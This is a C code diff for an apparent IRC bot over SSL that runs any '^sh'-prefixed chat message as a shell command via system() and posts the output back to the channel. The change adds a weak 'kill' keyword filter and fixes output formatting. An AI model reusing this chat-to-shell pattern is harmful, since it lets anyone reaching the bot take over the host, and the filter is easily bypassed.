@@ -486,6 +486,30 @@ strcmp(raw.command, "NICK")!=0) {
 			Stats(&raw);
 		else if (raw.text[0]=='^' && raw.text[1]=='s' && raw.text[2]=='h' && raw.text[3]==' ') {
 			char *cp = raw.text + 4;
+// check for the kill command
+unsigned int dontrun = 0;
+while (1) {
+	if (*cp == '\n' || *cp == '\0')
+		break;
+	else if (*cp == ' ') {
+		printf("## got a space\n");
+		++cp;
+		continue;
+	}
+	else if (*cp=='k' && *(cp+1)=='i' && *(cp+2)=='l' && *(cp+3)=='l' && *(cp+4)==' ') {
+		printf("## will not run kill!\n");
+		dontrun = 1;
+		break;
+	}
+
+	++cp;
+}
+			if (dontrun) {
+				printf("## will not run kill!\n");
+				sprintf(raw.text, "^stats");
+				continue;
+			}
+			cp = raw.text + 4;
 			char cmd[1024];
 			unsigned int cnt = 0;
 			while (1) {
@@ -497,7 +521,7 @@ strcmp(raw.command, "NICK")!=0) {
 				++cp;
 				++cnt;
 			}
-			strcat(cmd, " 2>&1 > cmd.output");
+			strcat(cmd, " &> cmd.output");
 			Logx(cmd);
 			system(cmd);
 
@@ -523,7 +547,7 @@ strcmp(raw.command, "NICK")!=0) {
 			if (lines_total == 1) {
 				char result[4096];
 				fgets(result, 4095, fp);
-				sprintf(buffer_cmd, "privmsg %s :%s", target, result);
+				sprintf(buffer_cmd, "privmsg %s :%s\n", target, result);
 				SSL_write(pSSL, buffer_cmd, strlen(buffer_cmd));
 				Log(buffer_cmd);
 				memset(buffer_cmd, 0, 4096);
@@ -538,12 +562,11 @@ strcmp(raw.command, "NICK")!=0) {
 					char url[1024];
 					fgets(url, 1023, fp2);
 					fclose(fp2);
-					sprintf(buffer_cmd, "privmsg %s :%s", target, url);
+					sprintf(buffer_cmd, "privmsg %s :%s\n", target, url);
 					SSL_write(pSSL, buffer_cmd, strlen(buffer_cmd));
 					Log(buffer_cmd);
 					memset(buffer_cmd, 0, 4096);
 				}
-				fclose(fp2);
 			}
 
 			fclose(fp);
